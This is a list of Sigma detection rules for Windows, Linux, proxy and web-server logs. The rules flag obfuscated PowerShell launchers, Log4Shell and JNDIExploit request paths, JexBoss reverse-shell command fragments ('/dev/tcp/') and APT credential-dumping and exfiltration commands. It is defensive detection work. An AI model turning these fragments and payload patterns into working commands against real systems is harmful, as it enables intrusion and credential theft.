<li><a href="#">title:Invoke-Obfuscation STDIN+ Launcher id: 0c718a5e-4284-4fb9-b4d9-b9a50b3a1974 related: - id: 72862bf2-0eb1-11eb-adc1-0242ac120002 type: derived description: Detects Obfuscated use of stdin to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2022/02/03 references: - #(Task 25) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains|all: - 'cmd' - 'powershell' selection2: ServiceFileName|contains: - '${input}' - 'noexit' selection3: ServiceFileName|contains: - ' /c ' - ' /r ' condition: all of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation STDIN+ Launcher id: 6c96fc76-0eb1-11eb-adc1-0242ac120002 status: test description: Detects Obfuscated use of stdin to execute PowerShell author: Jonathan Cheong, oscd.community references: - #(Task 25) date: 2020/10/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: '.*cmd.{0,5}(?:\/c|\/r).+powershell.+(?:\$\{?input\}?|noexit).+\"' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation STDIN+ Launcher id: 72862bf2-0eb1-11eb-adc1-0242ac120002 description: Detects Obfuscated use of stdin to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2021/11/30 references: - #(Task 25) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|re: '.*cmd.{0,5}(?:\/c|\/r).+powershell.+(?:\$\{?input\}?|noexit).+\"' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation STDIN+ Launcher id: 779c8c12-0eb1-11eb-adc1-0242ac120002 description: Detects Obfuscated use of stdin to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2021/10/16 references: - #(Task 25) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: '.*cmd.{0,5}(?:\/c|\/r).+powershell.+(?:\$\{?input\}?|noexit).+\"' condition: selection_4104 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation STDIN+ Launcher id: 9ac8b09b-45de-4a07-9da1-0de8c09304a3 related: - id: 779c8c12-0eb1-11eb-adc1-0242ac120002 type: derived description: Detects Obfuscated use of stdin to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2021/10/16 references: - #(Task 25) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_4103: Payload|re: '.*cmd.{0,5}(?:\/c|\/r).+powershell.+(?:\$\{?input\}?|noexit).+\"' condition: selection_4103 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation VAR+ Launcher id: 0adfbc14-0ed1-11eb-adc1-0242ac120002 description: Detects Obfuscated use of Environment Variables to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2021/10/16 references: - #(Task 24) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: '.*cmd.{0,5}(?:\/c|\/r)(?:\s|)\"set\s[a-zA-Z]{3,6}.*(?:\{\d\}){1,}\\\"\s+?\-f(?:.*\)){1,}.*\"' condition: selection_4104 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation VAR+ Launcher id: 27aec9c9-dbb0-4939-8422-1742242471d0 status: test description: Detects Obfuscated use of Environment Variables to execute PowerShell author: Jonathan Cheong, oscd.community references: - #(Task 24) date: 2020/10/15 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: '.*cmd.{0,5}(?:\/c|\/r)(?:\s|)\"set\s[a-zA-Z]{3,6}.*(?:\{\d\}){1,}\\\"\s+?\-f(?:.*\)){1,}.*\"' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation VAR+ Launcher id: 6bfb8fa7-b2e7-4f6c-8d9d-824e5d06ea9e related: - id: 0adfbc14-0ed1-11eb-adc1-0242ac120002 type: derived description: Detects Obfuscated use of Environment Variables to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2021/10/16 references: - #(Task 24) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_4103: Payload|re: '.*cmd.{0,5}(?:\/c|\/r)(?:\s|)\"set\s[a-zA-Z]{3,6}.*(?:\{\d\}){1,}\\\"\s+?\-f(?:.*\)){1,}.*\"' condition: selection_4103 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation VAR+ Launcher id: 8ca7004b-e620-4ecb-870e-86129b5b8e75 description: Detects Obfuscated use of Environment Variables to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2021/11/30 references: - #(Task 24) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|re: '.*cmd.{0,5}(?:\/c|\/r)(?:\s|)\"set\s[a-zA-Z]{3,6}.*(?:\{\d\}){1,}\\\"\s+?\-f(?:.*\)){1,}.*\"' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation VAR+ Launcher id: dcf2db1f-f091-425b-a821-c05875b8925a related: - id: 8ca7004b-e620-4ecb-870e-86129b5b8e75 type: derived description: Detects Obfuscated use of Environment Variables to execute PowerShell status: experimental author: Jonathan Cheong, oscd.community date: 2020/10/15 modified: 2021/12/02 references: - #(Task 24) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|re: '.*cmd.{0,5}(?:\/c|\/r)(?:\s|)\"set\s[a-zA-Z]{3,6}.*(?:\{\d\}){1,}\\\"\s+?\-f(?:.*\)){1,}.*\"' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION id: 14bcba49-a428-42d9-b943-e2ce0f0f7ae6 description: Detects Obfuscated Powershell via VAR++ LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/13 modified: 2021/11/30 references: - #(Task27) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|re: '(?i).*&&set.*(\{\d\}){2,}\\\"\s+?\-f.*&&.*cmd.*\/c' # FPs with |\/r condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION id: 4c54ba8f-73d2-4d40-8890-d9cf1dca3d30 related: - id: 14bcba49-a428-42d9-b943-e2ce0f0f7ae6 type: derived description: Detects Obfuscated Powershell via VAR++ LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/13 modified: 2021/09/18 references: - #(Task27) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|re: '(?i).*&&set.*(\{\d\}){2,}\\\"\s+?\-f.*&&.*cmd.*\/c' # FPs with |\/r condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION id: e54f5149-6ba3-49cf-b153-070d24679126 description: Detects Obfuscated Powershell via VAR++ LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/13 modified: 2021/10/16 references: - #(Task27) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: '(?i).*&&set.*(\{\d\}){2,}\\\"\s+?\-f.*&&.*cmd.*\/c' # FPs with |\/r condition: selection_4104 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION id: e9f55347-2928-4c06-88e5-1a7f8169942e status: test description: Detects Obfuscated Powershell via VAR++ LAUNCHER author: Timur Zinniatullin, oscd.community references: - #(Task27) date: 2020/10/13 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: '(?i).*&&set.*(\{\d\}){2,}\\\"\s+?\-f.*&&.*cmd.*\/c' # FPs with |\/r condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION id: f3c89218-8c3d-4ba9-9974-f1d8e6a1b4a6 related: - id: e54f5149-6ba3-49cf-b153-070d24679126 type: derived description: Detects Obfuscated Powershell via VAR++ LAUNCHER status: experimental author: Timur Zinniatullin, oscd.community date: 2020/10/13 modified: 2021/10/16 references: - #(Task27) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabledd detection: selection_4103: Payload|re: '(?i).*&&set.*(\{\d\}){2,}\\\"\s+?\-f.*&&.*cmd.*\/c' # FPs with |\/r condition: selection_4103 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Via Stdin id: 487c7524-f892-4054-b263-8a0ace63fc25 description: Detects Obfuscated Powershell via Stdin in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/12 modified: 2021/11/30 references: - #(Task28) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|re: '(?i).*(set).*&&\s?set.*(environment|invoke).*&&.*"' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Via Stdin id: 80b708f3-d034-40e4-a6c8-d23b7a7db3d1 related: - id: 487c7524-f892-4054-b263-8a0ace63fc25 type: derived description: Detects Obfuscated Powershell via Stdin in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/12 modified: 2022/02/03 references: - #(Task28) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains|all: - 'set' - '&&' ServiceFileName|contains: - 'environment' - 'invoke' - '${input)' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Via Stdin id: 86b896ba-ffa1-4fea-83e3-ee28a4c915c7 description: Detects Obfuscated Powershell via Stdin in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/12 modified: 2021/10/16 references: - #(Task28) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: '(?i).*(set).*&&\s?set.*(environment|invoke).*&&.*"' condition: selection_4104 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Via Stdin id: 9c14c9fa-1a63-4a64-8e57-d19280559490 status: test description: Detects Obfuscated Powershell via Stdin in Scripts author: Nikita Nazarov, oscd.community references: - #(Task28) date: 2020/10/12 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: '(?i).*(set).*&&\s?set.*(environment|invoke).*&&.*"' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation Via Stdin id: c72aca44-8d52-45ad-8f81-f96c4d3c755e related: - id: 86b896ba-ffa1-4fea-83e3-ee28a4c915c7 type: derived description: Detects Obfuscated Powershell via Stdin in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/12 modified: 2021/10/16 references: - #(Task28) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_4103: Payload|re: '(?i).*(set).*&&\s?set.*(environment|invoke).*&&.*"' condition: selection_4103 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Via Use Clip id: 1a0a2ff1-611b-4dac-8216-8a7b47c618a6 related: - id: 63e3365d-4824-42d8-8b82-e56810fefa0c type: derived description: Detects Obfuscated Powershell via use Clip.exe in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2022/04/26 references: - #(Task29) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains: '(Clipboard|i' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Via Use Clip id: 63e3365d-4824-42d8-8b82-e56810fefa0c description: Detects Obfuscated Powershell via use Clip.exe in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2022/04/26 references: - #(Task29) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|contains: '(Clipboard|i' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Via Use Clip id: db92dd33-a3ad-49cf-8c2c-608c3e30ace0 description: Detects Obfuscated Powershell via use Clip.exe in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2021/10/16 references: - #(Task29) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|re: '(?i).*?echo.*clip.*&&.*(Clipboard|i`?n`?v`?o`?k`?e`?).*' condition: selection_4104 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Via Use Clip id: e1561947-b4e3-4a74-9bdd-83baed21bdb5 status: test description: Detects Obfuscated Powershell via use Clip.exe in Scripts author: Nikita Nazarov, oscd.community references: - #(Task29) date: 2020/10/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|re: '(?i).*?echo.*clip.*&&.*(Clipboard|i`?n`?v`?o`?k`?e`?).*' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation Via Use Clip id: ebdf49d8-b89c-46c9-8fdf-2c308406f6bd related: - id: db92dd33-a3ad-49cf-8c2c-608c3e30ace0 type: derived description: Detects Obfuscated Powershell via use Clip.exe in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2021/10/16 references: - #(Task29) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_4103: Payload|re: '(?i).*?echo.*clip.*&&.*(Clipboard|i`?n`?v`?o`?k`?e`?).*' condition: selection_4103 falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Via Use MSHTA id: 07ad2ea8-6a55-4ac6-bf3e-91b8e59676eb related: - id: e55a5195-4724-480e-a77e-3ebe64bd3759 type: derived description: Detects Obfuscated Powershell via use MSHTA in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/08 modified: 2022/03/07 references: - #(Task31) logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabledd detection: selection_4103: Payload|contains|all: - 'set' - '&&' - 'mshta' - 'vbscript:createobject' - '.run' - '(window.close)' condition: selection_4103 falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation Via Use MSHTA id: 7e9c7999-0f9b-4d4a-a6ed-af6d553d4af4 description: Detects Obfuscated Powershell via use MSHTA in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2022/07/05 references: - #(Task31) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|contains|all: - 'mshta' - 'vbscript:createobject' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Via Use MSHTA id: 9b8d9203-4e0f-4cd9-bb06-4cc4ea6d0e9a related: - id: 7e9c7999-0f9b-4d4a-a6ed-af6d553d4af4 type: derived description: Detects Obfuscated Powershell via use MSHTA in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2022/02/03 references: - #(Task31) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains|all: - 'mshta' - 'vbscript:createobject' - '.run' - 'window.close' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Invoke-Obfuscation Via Use MSHTA id: ac20ae82-8758-4f38-958e-b44a3140ca88 status: test description: Detects Obfuscated Powershell via use MSHTA in Scripts author: Nikita Nazarov, oscd.community references: - #(Task31) date: 2020/10/08 modified: 2022/03/08 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'set' - '&&' - 'mshta' - 'vbscript:createobject' - '.run' - '(window.close)' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation Via Use MSHTA id: e55a5195-4724-480e-a77e-3ebe64bd3759 description: Detects Obfuscated Powershell via use MSHTA in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/08 modified: 2022/03/07 references: - #(Task31) logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|contains|all: - 'set' - '&&' - 'mshta' - 'vbscript:createobject' - '.run' - '(window.close)' condition: selection_4104 falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation Via Use Rundll32 id: 36c5146c-d127-4f85-8e21-01bf62355d5a status: test description: Detects Obfuscated Powershell via use Rundll32 in Scripts author: Nikita Nazarov, oscd.community references: - date: 2019/10/08 modified: 2022/03/08 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '&&' - 'rundll32' - 'shell32.dll' - 'shellexec_rundll' CommandLine|contains: - 'value' - 'invoke' - 'comspec' - 'iex' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation Via Use Rundll32 id: 641a4bfb-c017-44f7-800c-2aee0184ce9b description: Detects Obfuscated Powershell via use Rundll32 in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2022/03/07 references: - #(Task30) logsource: product: windows service: system detection: selection: Provider_Name: 'Service Control Manager' EventID: 7045 ImagePath|contains|all: - '&&' - 'rundll32' - 'shell32.dll' - 'shellexec_rundll' ImagePath|contains: - 'value' - 'invoke' - 'comspec' - 'iex' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation Via Use Rundll32 id: 88a22f69-62f9-4b8a-aa00-6b0212f2f05a related: - id: a5a30a6e-75ca-4233-8b8c-42e0f2037d3b type: derived description: Detects Obfuscated Powershell via use Rundll32 in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2019/10/08 modified: 2022/03/08 references: - logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_4103: Payload|contains|all: - '&&' - 'rundll32' - 'shell32.dll' - 'shellexec_rundll' Payload|contains: - 'value' - 'invoke' - 'comspec' - 'iex' condition: selection_4103 falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation Via Use Rundll32 id: a5a30a6e-75ca-4233-8b8c-42e0f2037d3b description: Detects Obfuscated Powershell via use Rundll32 in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2019/10/08 modified: 2022/03/08 references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_4104: ScriptBlockText|contains|all: - '&&' - 'rundll32' - 'shell32.dll' - 'shellexec_rundll' ScriptBlockText|contains: - 'value' - 'invoke' - 'comspec' - 'iex' condition: selection_4104 falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 
<li><a href="#">title:Invoke-Obfuscation Via Use Rundll32 id: cd0f7229-d16f-42de-8fe3-fba365fbcb3a related: - id: 641a4bfb-c017-44f7-800c-2aee0184ce9b type: derived description: Detects Obfuscated Powershell via use Rundll32 in Scripts status: experimental author: Nikita Nazarov, oscd.community date: 2020/10/09 modified: 2022/03/06 references: - #(Task30) tags: - attack.defense_evasion - attack.t1027 - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: EventID: 4697 ServiceFileName|contains|all: - '&&' - 'rundll32' - 'shell32.dll' - 'shellexec_rundll' ServiceFileName|contains: - value - invoke - comspec - iex condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:iOS Implant URL Pattern id: e06ac91d-b9e6-443d-8e5b-af749e7aa6b6 status: test description: Detects URL pattern used by iOS Implant author: Florian Roth references: - - date: 2019/08/30 modified: 2021/11/27 logsource: category: proxy detection: selection: c-uri|contains: '/list/suc?name=' condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Unknown level: critical tags: - attack.execution - attack.t1203 - attack.collection - attack.t1005 - attack.t1119 - attack.credential_access - attack.t1528 - attack.t1552.001 
<li><a href="#">title:ISO Image Mount id: 0248a7bc-8a9a-4cd8-a57e-3ae8e073a073 description: Detects the mount of ISO images on an endpoint status: experimental date: 2021/05/29 modified: 2021/11/20 author: Syed Hasan (@syedhasan009) references: - - - tags: - attack.initial_access - attack.t1566.001 logsource: product: windows service: security definition: 'The advanced audit policy setting "Object Access > Audit Removable Storage" must be configured for Success/Failure' detection: selection: EventID: 4663 ObjectServer: 'Security' ObjectType: 'File' ObjectName: '\Device\CdRom*' filter: ObjectName: '\Device\CdRom0\setup.exe' condition: selection and not filter falsepositives: - Software installation ISO files level: medium 
<li><a href="#">title:ISO or Image Mount Indicator in Recent Files id: 4358e5a5-7542-4dcb-b9f3-87667371839b description: Detects the creation of recent element file that points to an .ISO, .IMG, .VHD or .VHDX file as often used in phishing attacks. This can be a false positive on server systems but on workstations users should rarely mount .iso or .img files. status: experimental author: Florian Roth references: - - - - date: 2022/02/11 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: - '.iso.lnk' - '.img.lnk' - '.vhd.lnk' - '.vhdx.lnk' TargetFilename|contains: '\Microsoft\Windows\Recent\' condition: selection falsepositives: - Cases in which a user mounts an image file for legitimate reasons level: medium 
<li><a href="#">title:Java Class Proxy Download id: 53c15703-b04c-42bb-9055-1937ddfb3392 status: experimental description: Detects Java class download in proxy logs, e.g. used in Log4shell exploitation attacks against Log4j. references: - author: Andreas Hunkeler (@Karneades) date: 2021/12/21 tags: - attack.initial_access logsource: category: proxy detection: selection: c-uri|endswith: '.class' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Java Payload Strings id: 583aa0a2-30b1-4d62-8bf3-ab73689efe6c status: experimental description: Detects possible Java payloads in web access logs author: frack113 date: 2022/06/04 modified: 2022/06/14 references: - - - - logsource: category: webserver detection: keywords: - '%24%7B%28%23a%3D%40' - '${(#a=@' - '%24%7B%40java' - '${@java' - 'u0022java' - '%2F%24%7B%23' - '/${#' - 'new+java.' condition: keywords falsepositives: - Legitimate apps level: high tags: - cve.2022.26134 - cve.2021.26084 
<li><a href="#">title:Java Running with Remote Debugging id: 8f88e3f6-2a49-48f5-a5c4-2f7eedf78710 status: test description: Detects a JAVA process running with remote debugging allowing more than just localhost to connect author: Florian Roth date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: 'transport=dt_socket,address=' exclusion: - CommandLine|contains: 'address=127.0.0.1' - CommandLine|contains: 'address=localhost' condition: selection and not exclusion fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium tags: - attack.t1203 - attack.execution 
<li><a href="#">title:JexBoss Command Sequence id: 8ec2c8b4-557a-4121-b87c-5dfb3a602fae status: test description: Detects suspicious command sequence that JexBoss author: Florian Roth references: - date: 2017/08/24 modified: 2021/11/27 logsource: product: linux detection: selection1: - 'bash -c /bin/bash' selection2: - '&/dev/tcp/' condition: selection1 and selection2 falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.004 
<li><a href="#">title:Jlaive Usage For Assembly Execution In-Memory id: 0a99eb3e-1617-41bd-b095-13dc767f3def description: Detect the use of Jlaive to execute assemblies in a copied PowerShell status: experimental date: 2022/05/24 modified: 2022/05/24 author: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk) references: - - logsource: product: windows category: process_creation detection: parent_selection: ParentImage|endswith: '\cmd.exe' ParentCommandLine|endswith: '.bat' selection1: Image|endswith: '\xcopy.exe' CommandLine|contains|all: - 'powershell.exe' - '.bat.exe' selection2: Image|endswith: '\attrib.exe' CommandLine|contains|all: - '+s' - '+h' - '.bat.exe' condition: parent_selection and 1 of selection* falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059.003 
<li><a href="#">title:JNDIExploit Pattern id: 412d55bc-7737-4d25-9542-5b396867ce55 status: experimental description: Detects exploitation attempt using the JDNIExploiit Kit author: Florian Roth date: 2021/12/12 references: - - logsource: category: webserver detection: keywords: - '/Basic/Command/Base64/' - '/Basic/ReverseShell/' - '/Basic/TomcatMemshell' - '/Basic/JettyMemshell' - '/Basic/WeblogicMemshell' - '/Basic/JBossMemshell' - '/Basic/WebsphereMemshell' - '/Basic/SpringMemshell' - '/Deserialization/URLDNS/' - '/Deserialization/CommonsCollections1/Dnslog/' - '/Deserialization/CommonsCollections2/Command/Base64/' - '/Deserialization/CommonsBeanutils1/ReverseShell/' - '/Deserialization/Jre8u20/TomcatMemshell' - '/TomcatBypass/Dnslog/' - '/TomcatBypass/Command/' - '/TomcatBypass/ReverseShell/' - '/TomcatBypass/TomcatMemshell' - '/TomcatBypass/SpringMemshell' - '/GroovyBypass/Command/' - '/WebsphereBypass/Upload/' condition: keywords falsepositives: - Legitimate apps the use these paths level: high 
<li><a href="#">title:JSC Convert Javascript To Executable id: 52788a70-f1da-40dd-8fbd-73b5865d6568 status: experimental description: Detects the execution of the LOLBIN jsc.exe used by .NET to compile javascript code to .exe or .dll format references: - author: frack113 date: 2022/05/02 logsource: product: windows category: process_creation detection: selection: Image|endswith: '\jsc.exe' CommandLine|contains: '.js' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1127 
<li><a href="#">title:Judgement Panda Credential Access Activity id: b83f5166-9237-4b5e-9cd4-7b5d52f4d8ee status: test description: Detects Russian group activity as described in Global Threat Report 2019 by Crowdstrike author: Florian Roth references: - date: 2019/02/21 modified: 2022/06/28 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\xcopy.exe' CommandLine|contains|all: - '/S' - '/E' - '/C' - '/Q' - '/H' - '\\' selection2: Image|endswith: '\adexplorer.exe' CommandLine|contains|all: - '-snapshot' - '""' - 'c:\users\' condition: 1 of selection* falsepositives: - Unknown level: critical tags: - attack.credential_access - attack.t1552.001 - attack.t1003.003 
<li><a href="#">title:Judgement Panda Exfil Activity id: 03e2746e-2b31-42f1-ab7a-eb39365b2422 status: test description: Detects Judgement Panda activity as described in Global Threat Report 2019 by Crowdstrike author: Florian Roth references: - date: 2019/02/21 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: - CommandLine|endswith: 'eprod.ldf' - CommandLine|contains: - '\ldifde.exe -f -n ' - '\7za.exe a 1.7z ' - '\aaaa\procdump64.exe' - '\aaaa\netsess.exe' - '\aaaa\7za.exe' - 'copy .\1.7z \' - 'copy \\client\c$\aaaa\' selection2: Image: C:\Users\Public\7za.exe condition: selection1 or selection2 falsepositives: - Unknown level: critical tags: - attack.lateral_movement - attack.g0010 - attack.credential_access - attack.t1003.001 - attack.exfiltration - attack.t1560.001 
<li><a href="#">title:Ke3chang Registry Key Modifications id: 7b544661-69fc-419f-9a59-82ccc328f205 status: test description: Detects Registry modifications performed by Ke3chang malware in campaigns running in 2019 and 2020 author: Markus Neis, Swisscom references: - - date: 2020/06/18 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: # Ke3chang and TidePool both modify the IEHarden registry key, as well as the following list of keys. # Setting these registry keys is unique to the Ke3chang and TidePool malware families. # HKCU\Software\Microsoft\Internet Explorer\Main\Check_Associations # HKCU\Software\Microsoft\Internet Explorer\Main\DisableFirstRunCustomize # HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\IEharden CommandLine|contains: - '-Property DWORD -name DisableFirstRunCustomize -value 2 -Force' - '-Property String -name Check_Associations -value' - '-Property DWORD -name IEHarden -value 0 -Force' condition: selection1 falsepositives: - Will need to be looked for combinations of those processes level: critical tags: - attack.g0004 - attack.defense_evasion - attack.t1562.001 
